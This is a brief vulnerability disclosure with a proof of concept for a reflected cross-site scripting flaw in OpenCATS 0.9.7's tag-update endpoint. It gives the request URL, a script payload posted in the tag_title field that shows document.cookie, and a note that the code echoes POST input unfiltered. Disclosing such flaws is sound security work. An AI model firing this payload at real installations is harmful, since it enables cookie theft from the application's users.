# Opencats-0.9.7-Reflected XSS in onChangeTag
Date: 2022/12/25

Exploit Author: Sakura501

Vendor Homepage: https://www.opencats.org/

Software Link: https://github.com/opencats/OpenCATS

Version: 0.9.7

Tested on: Windows11/PHP7.3.4/MySQL5.7.26

## URL&POC
`http://192.168.2.153/src/opencats/index.php?m=settings&a=ajax_tags_upd`

POST:`tag_title=<script>alert(document.cookie);</script>`

## Result show
Just visit `http://192.168.2.153/src/opencats/index.php?m=settings&a=ajax_tags_upd` and post `tag_title=<script>alert(document.cookie);</script>`, then the reflected XSS
will be triggered.

![image](https://user-images.githubusercontent.com/71068573/209461938-1ffd3a14-6fb1-41d5-bae7-d8860c7d4789.png)

## Source code analysis
Directly echo the content of POST, it should be deleted.

![image](https://user-images.githubusercontent.com/71068573/209461981-1bd70292-d0f7-4bb5-b47f-9a09ce2e1073.png)

![image](https://user-images.githubusercontent.com/71068573/209461971-e1f54bb9-112c-4875-b165-907cbb19e02e.png)
